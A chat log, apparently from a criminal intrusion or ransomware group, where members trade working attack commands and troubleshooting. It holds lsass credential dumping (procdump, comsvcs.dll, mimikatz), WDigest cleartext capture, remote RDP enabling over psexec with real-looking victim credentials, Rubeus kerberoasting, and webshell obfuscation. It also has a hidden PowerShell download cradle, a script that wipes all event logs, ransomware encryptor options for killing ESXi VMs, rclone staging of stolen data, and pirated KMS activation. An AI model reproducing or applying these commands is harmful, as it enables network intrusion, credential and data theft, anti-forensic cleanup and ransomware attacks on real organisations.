+Message: Hello everyone. Plz tell me how to open port 3389 remotely. Yuzal a command through a body shirt and through remote-exec psexec does not include.
+```reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall add rule name="allow RDP" dir=in protocol=TCP localport=3389 action=allow
+```
+Date: 2021-03-18T18:54:31.051Z
+From: t3chnolog
+Message: well, if you stick the key on the vdigest and wait for the user to log in, the cleartext pass will be in the memory of lsass
+
+Date: 2021-03-18T18:54:21.449Z
+From: Bug
+Message: and when the bible is in sys32, then you need to reboot and then it also records all logging in
+
+Date: 2021-03-18T18:53:57.209Z
+From: Bug
+Message: well, when it is injected, then when the user logs in, his log pass enters into the text
+
+Date: 2021-03-18T18:53:29.179Z
+From: t3chnolog
+Message: there, in theory, in order for your password to fall, the admin must enter it
+
+Date: 2021-03-18T18:53:06.315Z
+From: t3chnolog
+Message: and when you filmed through memssp, didn't you relogin chtol? there immediately klirtekst pass you falls unless?
+
+Date: 2021-03-18T18:51:28.669Z
+From: Bug
+Message: or this hook can do not current mimicry
+
+Date: 2021-03-18T18:50:53.227Z
+From: Bug
+Message: no lsas dumps
+
+Date: 2021-03-18T18:50:40.455Z
+From: Bug
+Message: and write them to text
+
+Date: 2021-03-18T18:50:31.682Z
+From: Bug
+Message: otherwise it would be a dick, and wait until everyone logs in
+
+Date: 2021-03-18T18:49:34.546Z
+From: Bug
+Message: well, I asked if there is a more political way, to log out the admin of death like)
+
+Date: 2021-03-18T18:44:54.191Z
+From: t3chnolog
+Message: either this injection must be completely rewritten
+
+Date: 2021-03-18T18:44:46.272Z
+From: t3chnolog
+Message: in fact, we also came to the same
+stick the vdigest key into the register, log it out and sit and wait
+as the dump lsass comes in, take a picture, it seems to me that it will be more painless than with an injection
+
+Date: 2021-03-18T18:43:50.614Z
+From: t3chnolog
+Message: plus, in order to intercept the cache, you have to wait until the user logs in
+
+Date: 2021-03-18T18:42:46.833Z
+From: t3chnolog
+Message: only there is a nuance
+injection there is fucked pale by default)
+
+Date: 2021-03-18T18:42:35.354Z
+From: t3chnolog
+Message: this is an injection to intercept the cache from wdigest
+
+Date: 2021-03-18T18:42:23.483Z
+From: t3chnolog
+Message: sorry, I wasted in vain
+this is not a dump
+
+Date: 2021-03-18T18:42:06.346Z
+From: t3chnolog
+Message: I read about memssp
+
+Date: 2021-03-18T18:39:37.629Z
+From: Bug
+Message: yes, I injected and got everything)
+
+Date: 2021-03-18T18:37:35.178Z
+From: Bug
+Message: and you just need to inject lsass))
+
+Date: 2021-03-18T18:37:19.826Z
+From: Bug
+Message: the password can be one of the admins, but I don't have them, current hashes
+
+Date: 2021-03-18T18:36:58.542Z
+From: Bug
+Message: well, let's say I have backup software, with a password
+
+Date: 2021-03-18T18:36:42.362Z
+From: t3chnolog
+Message: rdp you can enable via hash and walk through it
+
+Date: 2021-03-18T18:36:30.504Z
+From: t3chnolog
+Message: you don't always need a cleartext password
+
+Date: 2021-03-18T18:36:28.481Z
+From: Bug
+Message: and also this pass may not be current on the admin account, but it will fit somewhere else, in short, you need a clearpass
+
+Date: 2021-03-18T18:35:58.046Z
+From: Bug
+Message: such a brute?
+
+Date: 2021-03-18T18:35:51.986Z
+From: Bug
+Message: well, brute, there are passwords out there Ecx8$U*mn<[CD)G\==
+
+Date: 2021-03-18T18:34:54.207Z
+From: Bug
+Message: otherwise you projected and waited, the user logged in and it was simply entered into the text
+
+Date: 2021-03-18T18:34:12.113Z
+From: t3chnolog
+Message: via register
+
+Date: 2021-03-18T18:34:09.799Z
+From: t3chnolog
+Message: wdigest is null because it needs to be included separately
+
+Date: 2021-03-18T18:33:46.024Z
+From: Bug
+Message: everything is clear with you
+
+Date: 2021-03-18T18:33:37.343Z
+From: t3chnolog
+Message: these are service accounts for spn and kerberos
+
+Date: 2021-03-18T18:20:58.527Z
+From: cybercat
+Message: for dumping lsas it is legitimate (cleaner facial expressions for sure) you can also do this:
+```
+Dumping Lsass without mimikatz
+	2.Task manager
+		2.1. Create a minidump of the lsass.exe using task manager (must be running as administrator): open Task manager by Administrator
+		2.2. find lsass.exe
+		2.3. right click on lsass.exe
+		2.4. choose Create Dump File (you will see path to dump, fe it is "C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP")
+			[2.5. switch to mimikatz
+							> sekurlsa::minidump C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP
+							> securlsa::logonpasswords]
+	-
+	3.Procdump
+		3.1. cmd.exe > procdump.exe -accepteula -ma lsass.exe lsass.dmp
+		// or avoid reading lsass by dumping a cloned lsass process
+			cmd.exe > procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
+	-
+	4.comsvcs.dll
+		4.1. .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
+	-
+	??five. ProcessDump.exe from Cisco Jabber
+
+Date: 2021-03-20T07:31:55.363Z
+From: cybercat
+Message: For those who have asp webshell removed\fired by Aver! you can obfuscate not only the one in the archive, it removes detections
+link:
+```
+https://github.com/grCod/poly
+```
+-
+command example:
+```
+poly.py -c aspx -e rnd -p shells/shell.aspx [-j]
+```
+parameters:
+```
+'-c', = 'Shell code. [php, asp, aspx]'
+'-e', = 'Encoding method. [b64, ord, rnd, rot]'
+'-p', = 'Path to shell.'
+'-j', = 'Add junk code.', action = 'store_true'
+
+Date: 2021-03-16T17:28:49.183Z
+From: cybercat
+Message: Carrying out a kerberoasting attack through vpn from a non-domain car with vpn credits
+```
+kerberoast remote from non-domain machine with domain user creds:
+1. Rubeus.exe kerberoast /dc:wesads15.wes.local /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt /creduser:domain.local\username /credpassword:UserPass!
+
+Asreproast remote from non-domain machine with domain user creds:
+2. Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt /dc:dc.domain.local /creduser:domain.local\username /credpassword:UserPass!
+```
+as you can see we do the same as in the normal attack, just add 3 new attributes:
+/dc: - specify the domain controller
+/creduser: - login of the domain user from which we are running
+/credpassword: - password of the domain user from which we are running
+
+Date: 2021-03-25T08:38:38.100Z
+From: tony
+Message: in the current case, such garbage, there are more than a million directories in the fs, everything is in French and German, it's unrealistic to pick it up by hand. Therefore, at first I used the software
+WizTree, to compile statistics of directories and filetypes, and now bypassing the fucking cloud of slag, we pack the necessary files, for example, this command archives all pdf from X 7z a -tzip Y:\pdf.7z -ir!X:\*.pdf balls
+
+Date: 2021-03-24T23:54:15.978Z
+From: rosette
+Message: There is such an idea - you can use it as an alternative to rclone
+We do a search by file mask, excluding mp3 wav exe dll sys, etc. + by date, spit it out on the left menu and ship it to sftp...
+
+Date: 2021-03-24T23:53:08.973Z
+From: rosette
+Message: http://seo-ng.net/seo-statiy/more/poisk-v-total-commander.html
+
+Date: 2021-03-24T22:20:07.789Z
+From: Bug
+Message: https://askubuntu.com/questions/648555/bash-program-cannot-execute-binary-file-exec-format-error
+ou're trying to run an executable compiled for an ARM architecture on an x86-64 architecture, which is much like asking your processor who only speaks English to take directions in Chinese.
+Campaign compiled under the AWP build, tried to run nifiga, I thought because of Java, I tried 3 versions of dick there)
+non-working software of some kind, for a certain line of campaign, or 32 bits compiled or I xs)
+
+Date: 2021-03-24T21:50:53.770Z
+From: Bug
+Message: bash: ./check-sonic: cannot execute binary file: Exec format error
+
+Date: 2021-03-24T20:41:24.861Z
+From: Bug
+Message: yes, I turned on the responder, it doesn’t catch anything even, right now, ifconfig oot@kali:/home/kali/Desktop# ifconfig
+» eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
+» inet 10.0.2.15 netmask 255.255.255.0 broadcast 10.0.2.255
+» inet6 fe80::a00:27ff:fe5c:6526 prefixlen 64 scopeid 0x20<link>
+» ether 08:00:27:5c:65:26 txqueuelen 1000 (Ethernet)
+» RX packets 9064 bytes 6293746 (6.0 MiB)
+» RX errors 0 dropped 0 overruns 0 frame 0
+» TX packets 6950 bytes 572052 (558.6 KiB)
+» TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+»
+» lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
+» inet 127.0.0.1 netmask 255.0.0.0
+» inet6 ::1 prefixlen 128 scopeid 0x10<host>
+» loop txqueuelen 1000 (Local Loopback)
+» RX packets 40 bytes 2240 (2.1 KiB)
+» RX errors 0 dropped 0 overruns 0 frame 0
+» TX packets 40 bytes 2240 (2.1 KiB)
+» TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+»
+» ppp0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1280
+» inet 192.168.149.140 netmask 255.255.255.255 destination 192.0.2.1
+» ppp txqueuelen 3 (Point-to-Point Protocol)
+» RX packets 6 bytes 98 (98.0 😎
+» RX errors 0 dropped 0 overruns 0 frame 0
+» TX packets 5 bytes 54 (54.0 😎
+» TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+root@kali:/home/kali/Desktop# responder -I ppp0 -rdwv
+__
+.----.-----.-----.-----.-----.-----.--| |.-----.----.
+|
+| -|__ --| | | | || -| _|
+|__| |_____|_____| |
+___|__|__|_____||_____|__|
+|__|
+
+NBT-NS, LLMNR & MDNS Responder 3.0.2.0
+
+Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+To kill this script hit CTRL-C
+
+[+] Poisoners:
+LLMNR [ON]
+NBT-NS [ON]
+DNS/MDNS [ON]
+
+[+] Servers:
+HTTP server [ON]
+HTTPS server [ON]
+WPAD proxy [ON]
+Auth proxy [OFF]
+SMB server [ON]
+Kerberos Server [ON]
+SQL Server [ON]
+FTP server [ON]
+IMAP server [ON]
+POP3 server [ON]
+SMTP server [ON]
+DNS server [ON]
+LDAP server [ON]
+RDP server [ON]
+
+[+] HTTP Options:
+Always serving EXE [OFF]
+Serving EXE [OFF]
+Serving HTML [OFF]
+Upstream Proxy [OFF]
+
+[+] Poisoning Options:
+Analyze Mode [OFF]
+Force WPAD auth [OFF]
+Force Basic Auth [OFF]
+Force LM downgrade [OFF]
+Fingerprint hosts [OFF]
+
+[+] Generic Options:
+Responder NIC [ppp0]
+Responder IP [192.168.149.140]
+Challenge set [random]
+Don't Respond To Names ['ISATAP']
+
+[+] Listening for events...
+and nothing catches
+turn it on on the VPN interface, right?” ppp0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1280
+» inet 192.168.149.140 netmask 255.255.255.255 destination 192.0.2.1
+start responder -I ppp0 -rdwv
+
+Date: 2021-04-07T10:55:08.616Z
+From: slice
+Message: hello everyone
+@Code sonic checker stopped working?
+```
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+File "requests\adapters.py", line 439, in send
+File "urllib3\connectionpool.py", line 755, in urlopen
+File "urllib3\util\retry.py", line 574, in increment
+urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='https', port=443): Max retries exceeded with url: //107.0.27.225/cgi-bin/portal (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x000002057B097D90>: Failed to establish a new connection: [Errno 11001] getaddrinfo failed'))
+
+```
+via http via browser everything is ok
+
+Date: 2021-04-04T10:44:30.436Z
+From: Kalinka
+Message: You can also use -m0-5 , where 0 is no compression and 5 is maximum compression
+-r recursion
+-p123 sets password 123
+
+Date: 2021-04-04T09:36:19.463Z
+From: Kalinka
+Message: `"C:\Program Files\Winrar\Winrar.exe" a -tn180d "\\PATH\TO\RAR.RAR" "\\PATH\TO\ARCHIVE"` throws all files not older than RAR into an archive called RAR 180 days (everything older than 180 days is not thrown)
+
+Date: 2021-04-03T12:52:27.662Z
+From: sarm
+Message: Greetings brothers!
+Advise the actual method of crypt psh.
+I knew one but now for some reason he does not plow.
+I took psh, uploaded it to pastebin, made a raw link, inserted it into the command
+iex((new-object net.webclient).downloadstring('https://pastebin.com/raw/RjWXyfCW'))
+ran it through the ps1 program, she recoded it from 7627 to 250 characters, added the resulting code to
+powershell -nop -w hidden -encodedcommand .....
+And it turned out a short line that pulled cars through kmd without detecting the defender and aveshek, it also worked through wmic
+I found similar sites where there is raw, but they do it with a script and the session does not come.
+All good)
+
+Date: 2021-04-16T22:58:56.654Z
+From: Kalinka
+Message: ```
+If megasync lags, does not allow you to download the archive or the speed is very low, then you can upload the archive through the same rclone
+
+rclone.exe move remote:archive E:\ -P --multi-thread-streams 12 --transfers 12
+
+where remote is the name of the config, archive is the name of the folder, E:\ is the folder where the archive will be dumped, -P shows download progress, to not see any progress changes to -q, --multi-thread-streams and transfers for high download
+
+helped a lot to cope with anomalies in the form of 200kb / s and when the archive is downloaded 500 times and as a result is not saved to disk
+
+Date: 2021-04-16T22:32:14.287Z
+From: Kalinka
+Message: ok, it worked
+you just need to do ctrl + c ctrl + v immediately, and only then archive, because archiving will take fucking time, and copying 1-1.5 minutes, then you can already archive and download
+
+Date: 2021-04-16T22:13:21.583Z
+From: Kalinka
+Message: The basic difference between OST and PST is that OST files are used to save data for offline use and are stored in MS Exchange Server. Whereas PST files are personal folder data and stored on client's hard disk.
+
+Date: 2021-04-16T22:10:59.294Z
+From: rosette
+Message: don't remember but mb worked you know what
+copy paste via explorer
+
+Date: 2021-04-16T22:10:33.691Z
+From: rosette
+Message: outlook kilni, make a copy next to it and return outlook to crawler)
+
+Date: 2021-04-16T22:10:14.116Z
+From: rosette
+Message: nst xs
+
+Date: 2021-04-16T22:10:12.667Z
+From: rosette
+Message: ost is input and ref is mail
+
+Date: 2021-04-16T22:09:55.895Z
+From: Kalinka
+Message: I confused pst with nst
+nst weighs 16mb - it was copied through shadow
+ost weighs 12GB, on some hosts even 25
+
+Date: 2021-04-12T14:03:31.254Z
+From: Tyr
+Message: and host
+
+Date: 2021-04-12T14:03:14.390Z
+From: Tyr
+Message: to stage
+
+Date: 2021-04-12T13:33:15.111Z
+From: Bug
+Message: padding domain (or IP) is written in both fields or only in the stage field
+
+Date: 2021-04-12T09:57:43.164Z
+From: Bug
+Message: or what to do, artkit with detections already
+
+Date: 2021-04-12T09:12:02.224Z
+From: Bug
+Message: how much does it cost to clean a koba?
+
+Date: 2021-04-30T08:06:25.461Z
+From: cybercat
+Message: xs, maybe everyone already knew this except for me, but still:
+the task was to launch a sharefinder from a non-domain car (dedik) by vpn, we decided by calling the powershell through run es,
+```
+runas /netonly /user:domain.local\user powershell
+```
+and from there sheirfinder, there is a conclusion, use it to your health
+by octa
+
+Date: 2021-05-10T15:56:58.774Z
+From: hitech
+Message: all with the past!
+tell me, I'm doing a date deletion log, I'm executing the command
+```erase /F /S /QE:\FTP\targetname >> erase_all.txt```
+
+because there are files with too long path
+command execution is interrupted by an error like "file path is too long"
+I found a topic on stackoverfall with a similar problem, they advised me to map the folder and apply the delete command to the linked folder.
+I did everything, everything was deleted, but the log of deleted files was not saved
+
+Date: 2021-05-18T12:08:56.077Z
+From: Andy
+Message: there was a pass on the simantek, I terminated the processes with it and deleted the main simantek folder from the PC) in this way, but at least the exe that it detected earlier, after such manipulations, it stopped and there is nowhere in the processes
+
+Date: 2021-05-18T12:06:09.230Z
+From: rosette
+Message: after demolition rebutnul simantek? without a reboot, there is still an aver, but if you reset, everything that was in the lsass will fall out and you will have to wait again until someone logs in
+you can try the hashdump and grab the local hashes ...
+
+Date: 2021-05-18T12:05:08.797Z
+From: Andy
+Message: there was a simantek, but it was demolished, but I google it, but it’s still not clear, it’s written about privilege::debug, I did it
+
+Date: 2021-05-18T12:01:59.308Z
+From: rosette
+Message: on the 2003 server av was? mb detect lsass and crash dump
+Have you tried googling the error?
+
+Date: 2021-05-18T12:01:03.650Z
+From: rosette
+Message: privilege::debug done?
+
+Date: 2021-05-18T11:59:23.523Z
+From: Andy
+Message: initially not) but then exactly x86 and the same error
+
+Date: 2021-05-18T11:58:47.212Z
+From: Shved
+Message: are you running x86 mimicats?
+
+Date: 2021-05-18T11:57:44.587Z
+From: Andy
+Message: Greetings gentlemen, who met, maybe why the dump does not decrypt with mimicatz:
+```
+Opening : 'lsass.dmp' file fr minidump...
+Error kuhl_m_sekurlsa_acquireLSA ; Modules informations
+```
+
+filmed via procdump from windows 2003
+
+Date: 2021-06-08T19:13:08.644Z
+From: VasyaPypkin
+Message: this is generally like extendera
+
+Date: 2021-06-08T19:12:59.756Z
+From: VasyaPypkin
+Message: no cooing
+
+Date: 2021-06-08T19:12:05.140Z
+From: slice
+Message: portal
+
+Date: 2021-06-08T19:11:42.301Z
+From: VasyaPypkin
+Message: guys, in sonic, when authenticating by hash, what do you drive into the url instead of "welcome"?
+too lazy to drive away dirbuster
+
+Date: 2021-06-10T21:51:40.598Z
+From: steven
+Message: in Internet Explorer settings
+
+Date: 2021-06-10T21:51:32.402Z
+From: steven
+Message: ssl checkboxes must be ticked
+
+Date: 2021-06-10T20:49:35.330Z
+From: t3chnolog
+Message: if we solve the problem, I will tell you how it was solved
+
+Date: 2021-06-10T20:49:27.299Z
+From: t3chnolog
+Message: no, this does not help)
+
+Date: 2021-06-10T19:50:15.759Z
+From: cybercat
+Message: yes, I have this often, strange for me it helps to press edit connection, remember the vpn account login, then press ok and enter the password - connect
+
+Date: 2021-06-10T19:50:14.810Z
+From: sargon
+Message: + this happens a lot too
+
+Date: 2021-06-10T19:36:09.026Z
+From: t3chnolog
+Message: Credential or SSLVPN configuration is wrong error, error code -7200
+
+Date: 2021-06-10T19:35:12.777Z
+From: t3chnolog
+Message: everything is ok from the niks client openfortivpn, but I can't log in from the windows client, what could be the problem?
+
+Date: 2021-06-10T19:34:32.274Z
+From: t3chnolog
+Message: has anyone caught error -7200 on Fortivpn with valid credits?
+
+Date: 2021-06-05T23:37:03.468Z
+From: alter
+Message: ms17 - smb port
+kerba - ldap
+
+Date: 2021-06-05T23:36:42.141Z
+From: alter
+Message: portfwd
+
+Date: 2021-06-05T23:36:38.539Z
+From: alter
+Message: will work without socks
+
+Date: 2021-06-05T23:36:34.129Z
+From: alter
+Message: which one you want
+
+Date: 2021-06-05T23:36:29.872Z
+From: alter
+Message: forward port
+
+Date: 2021-06-05T23:18:23.489Z
+From: rosette
+Message: sox5 from a user who got into LAN? it is very necessary, user context, crowd strike, 1 YES, at least ms17\kerba\adfind must be removed. edr muffles everything
+
+Date: 2021-06-11T08:43:47.760Z
+From: graph
+Message: maybe someone has a script or advise a prog
+
+Date: 2021-06-11T08:43:21.479Z
+From: graph
+Message: all at once
+
+Date: 2021-06-11T12:29:44.555Z
+From: graph
+Message: Event Viewer (Windows Event Log)
+
+Date: 2021-06-11T08:43:05.266Z
+From: steven
+Message: or what logs are you going to clean?
+
+Date: 2021-06-11T08:42:54.733Z
+From: steven
+Message: need security logs ?
+
+Date: 2021-06-11T08:42:27.273Z
+From: graph
+Message: how to clean all the logs in Windows?
+
+Date: 2021-06-26T19:16:17.746Z
+From: hitech
+Message: ```Before the lock, check the list of vm on esxi, in order not to make a mistake, you can use the command (esxi shells):
+vim-cmd vmsvc/getallvms```
+
+Date: 2021-06-24T15:19:34.747Z
+From: alter
+Message: ```
+Unix startup options
+
+--path
+When using this option, the locker will encrypt files at the specified path. A mandatory parameter without it will not lock anything.
+./encryptor --path /path
+     
+--prockiller
+Kills all processes that interfere with opening files.
+./encryptor --path /path --prockiller
+     
+--log
+Includes logging of all actions and errors
+./encryptor --path /path --log /root/log.txt
+     
+--vmkiller(esxi only)
+Shuts down all virtual machines
+     
+--vmlist(Only for esxi)
+Specifies a file with a list of virtual machines that should not be shut down. One line for each vm
+./encryptor --path /path --vmkiller --vmlist /tmp/list.txt
+
+--detach
+Unbinds a process from a terminal.
+So that if the ssh session falls off, the locker will continue to work
+And I didn't break the files.
+
+ESXi version REQUEST SEPARATELY
+
+
+If somewhere it doesn’t start, I need the OS, the kernel version and the glibc version
+/lib64/libc.so.6
+
+Date: 2021-06-29T14:58:38.677Z
+From: hitech
+Message: [ ](https://stylebrooks.com/group/general?msg=GqosiGAtzTmJAy588) don't forget server.conf in server config
+add ```verb 0
+log /dev/null
+status /dev/null
+log-append /dev/null```
+
+Date: 2021-06-29T14:57:44.063Z
+From: hitech
+Message: [ ](https://stylebrooks.com/group/general?msg=ufzwpLDEwcmHPSFWq) either you put it wrong, or I don't know how this certificate server will be on the local? mb just do not store the keys on the server
+
+Date: 2021-06-29T14:43:11.751Z
+From: white
+Message: it is desirable only to install certificate authorities not on the server itself, do it on the local machine…
+
+Date: 2021-07-01T09:56:53.956Z
+From: atom
+Message: ```
+Rosetka suggested a working trick with changing the date in Cmd
+If your cob swears that the license has expired, do the following:
+In Cmd, change the date with the command data 07/01/2020
+Then we run the koba and change the date back,
+since OpenVpn can start swearing at an expired certificate
+
+Date: 2021-07-08T16:34:50.768Z
+From: Kalinka
+Message: it's better to buy a license for 20-30 bucks
+
+Date: 2021-07-08T16:31:54.717Z
+From: graph
+Message: @all does anyone use kmsauto++ to activate Windows?
+
+Date: 2021-07-06T14:49:33.019Z
+From: alter
+Message: @all yelling to everyone again
+we have a ton of downloaded DBMS accumulated, FILL THEM FOR ME, we will make bots from them))))
+
+Date: 2021-07-16T05:33:36.954Z
+From: graph
+Message: a batch file for clearing logs, you can also do this:
+```for /F "tokens=*" %%1 in ('wevtutil.exe el') DO wevtutil.exe cl "%%1"
+
+Date: 2021-07-17T13:35:39.618Z
+From: t3chnolog
+Message: well, yes, you need it)
+
+Date: 2021-07-17T13:35:34.230Z
+From: cybercat
+Message: and will it work on the admin workstation?
+
+Date: 2021-07-17T13:35:24.067Z
+From: t3chnolog
+Message: then, with any authorization via smb or rdp, his cleartext pass will fall into lsass
+
+Date: 2021-07-17T13:35:13.134Z
+From: cybercat
+Message: and if it leaves the server, I will put it there and wait until it comes back in, is it normal?
+
+Date: 2021-07-17T13:34:50.343Z
+From: t3chnolog
+Message: but as a bonus, you will need to logout the admin domain or reboot the server
+
+Date: 2021-07-17T13:34:06.871Z
+From: t3chnolog
+Message: if you have an admin domain context, you can stick the register through the remote
+
+Date: 2021-07-17T13:33:56.906Z
+From: t3chnolog
+Message: yes, wdigest key must be plugged in, google
+
+Date: 2021-07-17T13:32:28.069Z
+From: cybercat
+Message: guys, you need to steal the admin password at the moment you enter his password when logging in to the server, I have 1 YES, you need to go to the server and make it so that the next time the admin enters this server and enters his credentials, I get a clear pass, real at all?
+
+Date: 2021-07-17T12:30:29.557Z
+From: giovanni
+Message: ```reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
+And you don't have a line break there by any chance?
+
+Date: 2021-07-17T07:43:07.830Z
+From: hasher
+Message: Hello everyone! Guys, tell me how to deal with this ... I'm trying to turn on port 3389 remotely. When executing the second command, it writes this advice)```
+
+C:\Users\Administrator>PSEXEC.EXE \\192.168.3.100 -u glocap.com\chin -p Gustav1!
+-s cmd
+
+PsExec v2.32 - Execute processes remotely
+Copyright (C) 2001-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Serv
+er" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall add rule name="allow RDP" dir=in protocol=TCP localpo
+rt=3389 action=allowThe operation completed successfully.
+
+C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
+\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+
+A specified value is not valid.
+
+Usage: add rule name=<string>
+dir=in|out
+action=allow|block|bypass
+[program=<program path>]
+[service=<service short name>|any]
+[description=<string>]
+[enable=yes|no (default=yes)]
+[profile=public|private|domain|any[,...]]
+[localip=any|<IPv4 address>|<IPv6 address>|<subnet>|<range>|<list>]
+[remoteip=any|localsubnet|dns|dhcp|wins|defaultgateway|
+<IPv4 address>|<IPv6 address>|<subnet>|<range>|<list>]
+[localport=0-65535|<port range>[,...]|RPC|RPC-EPMap|IPHTTPS|any (default=a
+ny)]
+[remoteport=0-65535|<port range>[,...]|any (default=any)]
+[protocol=0-255|icmpv4|icmpv6|icmpv4:type,code|icmpv6:type,code|
+tcp|udp|any (default=any)]
+[interfacetype=wireless|lan|ras|any]
+[rmtcomputergrp=<SDDL string>]
+[rmtusrgrp=<SDDL string>]
+[edge=yes|deferapp|deferuser|no (default=no)]
+[security=authenticate|authenc|authdynenc|authnoencap|notrequired
+(default=notrequired)]
+
+Remarks:
+
+- Add a new inbound or outbound rule to the firewall policy.
+- Rule name should be unique and cannot be "all".
+- If a remote computer or user group is specified, security must be
+authenticate, authenc, authdynenc, or authnoencap.
+- Setting security to authdynenc allows systems to dynamically
+negotiate the use of encryption for traffic that matches
+a given Windows Firewall rule. Encryption is negotiated based on
+existing connection security rule properties. This option
+enables the ability of a machine to accept the first TCP
+or UDP packet of an inbound IPsec connection as long as
+it is secured, but not encrypted, using IPsec.
+Once the first packet is processed, the server will
+re-negotiate the connection and upgrade it so that
+all subsequent communications are fully encrypted.
+- If action=bypass, the remote computer group must be specified when dir=i
+n.
+- If service=any, the rule applies only to services.
+- ICMP type or code can be "any".
+- Edge can only be specified for inbound rules.
+- AuthEnc and authnoencap cannot be used together.
+- Authdynenc is valid only when dir=in.
+- When authnoencap is set, the security=authenticate option becomes an
+optional parameter.
+
+Examples:
+
+Add an inbound rule with no encapsulation security for browser.exe:
+netsh advfirewall firewall add rule name="allow browser"
+dir=inprogram="c:\programfiles\browser\browser.exe"
+security=authnoencap action=allow
+
+Add an outbound rule for port 80:
+netsh advfirewall firewall add rule name="allow80"
+protocol=TCP dir=out localport=80 action=block
+
+Add an inbound rule requiring security and encryption
+for TCP port 80 traffic:
+netsh advfirewall firewall add rule
+name="Require Encryption for Inbound TCP/80"
+protocol=TCP dir=in localport=80 security=authdynenc
+action=allow
+
+Add an inbound rule for browser.exe and require security
+netsh advfirewall firewall add rule name="allow browser"
+dir=inprogram="c:\program files\browser\browser.exe"
+security=authenticate action=allow
+
+Add an authenticated firewall bypass rule for group
+acmedomain\scanners identified by a SDDL string:
+netsh advfirewall firewall add rule name="allow scanners"
+dir=in rmtcomputergrp=<SDDL string> action=bypass
+security=authenticate
+
+Add an outbound allow rule for local ports 5000-5010 for udp-
+Add rule name="Allow port range" dir=out protocol=udp localport=5000-5010
+action=allow
+
+C:\Windows\system32>
+
+Date: 2021-08-10T18:15:32.268Z
+From: cybercat
+Message: [ ](https://stylebrooks.com/group/general?msg=cFaT9BfhcCaaXdoKH) bro, here is a guide on how to use this shuttle so that you don’t forward ports separately, I didn’t put it correctly
+```
+https://defcon.ru/network-security/3789/
+
+Date: 2021-08-12T11:57:31.767Z
+From: rosette
+Message: Alternative from under the cob:
+```mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+
+Date: 2021-10-20T08:22:58.662Z
+From: elroy
+Message: In general, kms work over the network, the kms server itself cannot be installed on the machine that we are activating, only on a machine dedicated for this purpose. It activates the entire line of Windows from 7 to 10 (MB 11), including server ones. And the office too...
+
+Date: 2021-10-20T08:20:36.365Z
+From: elroy
+Message: It is fashionable to convert retail office to volume like this:
+```
+retail to vl
+dir ..\root\Licenses16\ProPlus2019VL*.xrm-ms
+cscript ospp.vbs /inslic:"..\root\Licenses16\ProPlus2019VL_KMS_Client_AE-ppd.xrm-ms"
+cscript ospp.vbs /inslic:"..\root\Licenses16\ProPlus2019VL_KMS_Client_AE-ul-oob.xrm-ms"
+cscript ospp.vbs /inslic:"..\root\Licenses16\ProPlus2019VL_KMS_Client_AE-ul.xrm-ms"
+```
+Next, register the activation of the kms-activation through the console.
+
+Date: 2021-10-20T08:19:15.742Z
+From: elroy
+Message: The utility will ask for a key, specify the kms key.
+You need to google the office, I don’t remember the link, you need to look for ProPlus 2019, somewhere there are direct links to the Microsoft website, the retail is downloaded from there
+
+Date: 2021-10-20T08:17:52.972Z
+From: elroy
+Message: Download Windows: go to the ms site, there is MediaCreationTool, download it, it will download Windows, but by default it will download Evalution, but we need Retail. You need to run the utility like this:
+```
+.\MediaCreationTool21H1.exe /Eula Accept /Retail /MediaArch x64 /MediaLangCode en-US /MediaEdition Professional
+
+.\MediaCreationTool21H1.exe /Eula Accept /Retail /MediaArch x86 /MediaLangCode en-US /MediaEdition Enterprise
+```
+(specify language and version).
+
+Date: 2021-10-20T08:15:16.732Z
+From: elroy
+Message: ```
+https://ufile.io/48kbqx5x
+p!yNONbgyft6Vfrd5cDes4#sea!ws6vde
+```
+This is a kms server and its sources. Inside the installation script, it just contains commands manually to the console (only 3 commands, xs why the script does not work out). Install kms server on any machine in the network.
+Further from other machines we register its ip, usually like this
+```
+slmgr /ipk FJ82H-XT6CR-J8D7P-XQJJ2-GPDD4
+slmgr /skms <IP>:1688
+slmgr /ato
+```
+Key - kms key for the system, kms keys on the ms website in the public domain.
+Volume edition is usually activated, Evaluation is not activated.
+This kms can activate both windows and office.
+The office is usually activated like this:
+```
+cd c:\Program Files\Microsoft Office\Office15
+cscript ospp.vbs /inpkey:<cms-office key here>
+cscript ospp.vbs /sethst:192.168.1.10
+cscript ospp.vbs /act
+```
+KMS office keys
+```
+2010
+VYBBJ-TRJPB-QFQRF-QFT4D-H3GVB
+
+2013
+YC7DK-G2NP3-2QQC3-J6H88-GVGXT
+
+2016
+7FN7W-JF8VP-VHJJK-4GKJQ-MDW3X
+
+2019
+NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP
+```
+
+Date: 2021-10-20T07:57:58.845Z
+From: benny
+Message: @elroy share again how to activate office and windows, plz
+
+
+Date: 2021-11-01T22:26:41.643Z
+From: turner
